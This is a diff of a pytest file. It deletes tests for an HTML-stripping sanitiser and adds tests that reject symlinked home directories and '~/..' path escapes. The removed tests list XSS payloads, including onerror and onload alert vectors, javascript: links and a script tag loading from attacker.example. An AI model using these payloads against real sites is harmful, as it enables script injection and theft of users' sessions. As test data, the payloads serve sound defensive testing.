@@ -1,81 +1,34 @@
+from pathlib import Path
+
 import pytest
 
-from services.text_safety import contains_html_markup, strip_html_markup
+from core.env_paths import expand_operator_path, operator_home
 
 
-@pytest.mark.parametrize(
-    ("payload", "expected"),
-    [
-        ("<img/src=x onerror=alert(1)>", ""),
-        ("<svg/onload=alert(1)>", ""),
-        ("<script src=//attacker.example/xss.js", ""),
-        ('<a href="javascript:alert(1)">click me</a>', "click me"),
-        ("<!--><script>alert(1)</script>-->", ""),
-        ("<script@x.y>alert(1)</script@x.y>", "alert(1)"),
-        ("<xmp>raw legacy text</xmp>", "raw legacy text"),
-        ("&lt;XMP&gt;raw legacy text&lt;/XMP&gt;", "raw legacy text"),
-        ("<listing>raw legacy text</listing>", "raw legacy text"),
-        ("<plaintext>raw legacy text", "raw legacy text"),
-    ],
-)
-def test_strip_html_markup_never_returns_raw_tag_like_payloads(payload, expected):
-    assert strip_html_markup(payload) == expected
+def test_operator_home_resolves_home_override(monkeypatch, tmp_path: Path) -> None:
+    home = tmp_path / "home"
+    home.mkdir()
+    monkeypatch.setenv("HOME", str(home))
+
+    assert operator_home() == home.resolve()
+    assert expand_operator_path("~/.env") == home.resolve() / ".env"
 
 
-@pytest.mark.parametrize(
-    "safe_text",
-    [
-        "Alice <alice@example.com>",
-        'AT&T: 2 < 3 and Tom "T"',
-        "Compare a < b before saving",
-        "Track <BudgetReview> next",
-    ],
-)
-def test_strip_html_markup_preserves_safe_angle_bracket_display_text(safe_text):
-    assert strip_html_markup(safe_text) == safe_text
+def test_operator_home_rejects_symlink(monkeypatch, tmp_path: Path) -> None:
+    real_home = tmp_path / "real-home"
+    linked_home = tmp_path / "linked-home"
+    real_home.mkdir()
+    linked_home.symlink_to(real_home, target_is_directory=True)
+    monkeypatch.setenv("HOME", str(linked_home))
+
+    with pytest.raises(ValueError, match="non-symlink"):
+        operator_home()
 
 
-def test_strip_html_markup_preserves_decoded_comment_terminator_text():
-    assert strip_html_markup("--&gt;") == "-->"
+def test_expand_operator_path_rejects_home_escape(monkeypatch, tmp_path: Path) -> None:
+    home = tmp_path / "home"
+    home.mkdir()
+    monkeypatch.setenv("HOME", str(home))
 
-
-def test_strip_html_markup_plain_text_fast_path_skips_parser(monkeypatch):
-    class ParserThatShouldNotRun:
-        def __init__(self):
-            raise AssertionError("plain-text fast path should not instantiate parser")
-
-    monkeypatch.setattr(
-        "services.text_safety._PlainTextHTMLParser", ParserThatShouldNotRun
-    )
-
-    assert (
-        strip_html_markup("plain   text\n\n second\tline ")
-        == "plain text\nsecond line"
-    )
-
-
-def test_contains_html_markup_allows_plain_alphabetic_comparison_text():
-    assert contains_html_markup("Compare a < b before saving") is False
-
-
-def test_contains_html_markup_allows_plain_bracketed_labels():
-    assert contains_html_markup("Track <BudgetReview> next") is False
-
-
-@pytest.mark.parametrize(
-    "payload",
-    [
-        "&lt;img src=x onerror=alert(document.domain)&gt;",
-        "<img/src=x onerror=alert(1)>",
-        "<svg/onload=alert(1)>",
-        "<math/href=javascript:alert(1)@x>",
-        "<script src=//attacker.example/xss.js",
-        "&lt;script src=//attacker.example/xss.js",
-        "<xmp>raw legacy text</xmp>",
-        "&lt;XMP&gt;raw legacy text&lt;/XMP&gt;",
-        "<listing>raw legacy text</listing>",
-        "<plaintext>raw legacy text",
-    ],
-)
-def test_contains_html_markup_flags_browser_tolerated_active_markup(payload):
-    assert contains_html_markup(payload) is True
+    with pytest.raises(ValueError, match="escapes"):
+        expand_operator_path("~/../outside.env")
